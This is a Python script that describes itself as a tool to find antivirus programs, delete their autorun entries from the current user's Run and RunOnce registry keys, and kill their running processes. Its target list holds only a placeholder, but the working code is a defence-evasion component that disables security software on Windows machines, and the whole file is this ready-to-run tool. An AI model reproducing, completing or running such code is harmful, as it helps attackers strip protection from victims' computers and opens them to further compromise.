# Tool to search for AV systems, remove their autorun registry key, and kill running processes
import os
import winreg
import psutil
import time

av_list = ["notepad++.exe"] # List names of AV systems/executables here

# Removes registry autorun entries (current user only)
reghives = [winreg.HKEY_CURRENT_USER]
regpaths = [r"Software\Microsoft\Windows\CurrentVersion\Run",
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"]

for reghive in reghives:
    for regpath in regpaths:
        try:
            reg = winreg.ConnectRegistry(None, reghive)
            key = winreg.OpenKey(reg, regpath, 0, winreg.KEY_READ | winreg.KEY_WRITE)

            index = 0
            while True:
                try:
                    val = winreg.EnumValue(key, index)
                    val_name, val_data = val[0], val[1]

                    for name in av_list:
                        if name.lower() in val_data.lower():
                            print(f"Deleting autorun key: {val_name}")
                            winreg.DeleteValue(key, val_name)
                            break

                    index += 1
                except OSError:
                    break

            winreg.CloseKey(key)
        except FileNotFoundError:
            pass
        except PermissionError:
            print(f"Permission denied for {regpath}. Skipping.")

# Finds and terminate running processes (current user only)
for proc in psutil.process_iter(['pid', 'name', 'username']):
    try:
        if proc.info['username'] == psutil.users()[0].name:
            for name in av_list:
                if name.lower() in proc.info['name'].lower():
                    print(f"Terminating process: {proc.info['name']} (PID: {proc.info['pid']})")
                    try:
                        proc.kill()
                    except psutil.AccessDenied:
                        print(f"Access Denied to kill {proc.info['name']}")
                    except psutil.NoSuchProcess:
                        print(f"{proc.info['name']} already closed")
                    timeout = 5
                    start_time = time.time()
                    while proc.is_running() and (time.time() - start_time) < timeout:
                        time.sleep(0.1)
                    if proc.is_running():
                        print(f"Process {proc.info['name']} did not close within the timeout.")
                    else:
                        print(f"Process {proc.info['name']} closed")

    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
        pass
